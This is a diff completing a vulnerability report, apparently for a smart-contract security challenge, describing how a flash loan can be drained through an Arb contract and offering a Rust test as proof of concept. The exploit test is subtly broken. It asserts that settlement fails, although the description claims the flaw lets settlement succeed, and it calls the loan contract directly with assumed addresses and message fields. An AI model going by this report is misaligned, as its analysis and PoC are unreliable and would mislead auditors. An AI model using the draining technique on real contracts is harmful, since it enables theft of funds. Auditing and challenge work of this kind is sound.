@@ -254,16 +254,76 @@ fn test_withdraw_accounting() {
 
 ### Description
 
-The bug occurs in ...
+The bug is within the interaction between the Proxy and Flash Loan contract. Specifically, the Flash Loan contract does not verify that the funds returned to it in settle_loan actually came from the Proxy contract.
+
+Here is the flow of the exploit:
+
+1. An unprivileged user sends a `RequestFlashLoan` to the Proxy contract, specifying the `Arb` contract as the recipient and an `Arb` action as the message.
+2. The Proxy contract sends the entire balance of the Flash Loan contract to the Arb contract.
+3. The Arb contract, instead of returning the funds to the Flash Loan contract, sends them to an arbitrary account.
+4. The Proxy contract then attempts to call settle_loan on the Flash Loan contract. However, the Flash Loan contract only checks that the function was called by the Proxy contract, not that the funds are actually present.
 
 ### Recommendation
 
-The fix should be ...
+Given the nature of the vulnerability, where a flash loan can be exploited by sending funds to an arbitrary account instead of back to the contract that issued the loan, a key fix would be to verify the source of the returned funds. The `SettleLoan` function must not just check if it was called by the proxy, but also ensure that the contract balance equals or exceeds the loan amount.
 
 ### Proof of concept
 
 ```rust
-// code goes here
+#[test]
+fn settle_loan_vulnerability() {
+    let (mut app, flash_loan_addr) = proper_instantiate();
+
+    // Assuming that we have the addresses for the Proxy and Arb contracts
+    let proxy_addr = Addr::unchecked("proxy");
+    let arb_addr = Addr::unchecked("arb");
+
+    // Set proxy address to the Proxy contract
+    app.execute_contract(
+        Addr::unchecked(ADMIN),
+        flash_loan_addr.clone(),
+        &ExecuteMsg::SetProxyAddr {
+            proxy_addr: proxy_addr.to_string(),
+        },
+        &[],
+    )
+    .unwrap();
+
+    // Request a flash loan with the Arb contract as the recipient
+    app.execute_contract(
+        proxy_addr.clone(),
+        flash_loan_addr.clone(),
+        &ExecuteMsg::RequestFlashLoan {
+            recipient: arb_addr.clone(),
+            arb_action: "Arb".to_string(),
+            params: "{\"Arb\":{\"recipient\":\"arbitrary_address\"}}".to_string(),
+        },
+        &[],
+    )
+    .unwrap();
+
+    // Check that the funds have been drained to the arbitrary address
+    let balance = app.wrap().query_balance("arbitrary_address", DENOM).unwrap();
+    assert_eq!(balance.amount, Uint128::new(10_000));
+
+    // Try to settle the loan, which should fail
+    let res = app.execute_contract(
+        proxy_addr,
+        flash_loan_addr.clone(),
+        &ExecuteMsg::SettleLoan {},
+        &[],
+    );
+
+    // Check if the result is an error
+    assert!(res.is_err(), "Settled loan without returning funds");
+
+    // The Flash Loan contract's balance should be zero after the attempted settlement
+    let balance = app
+        .wrap()
+        .query_balance(flash_loan_addr.to_string(), DENOM)
+        .unwrap();
+    assert_eq!(balance.amount, Uint128::zero());
+}
 ```
 
 ---
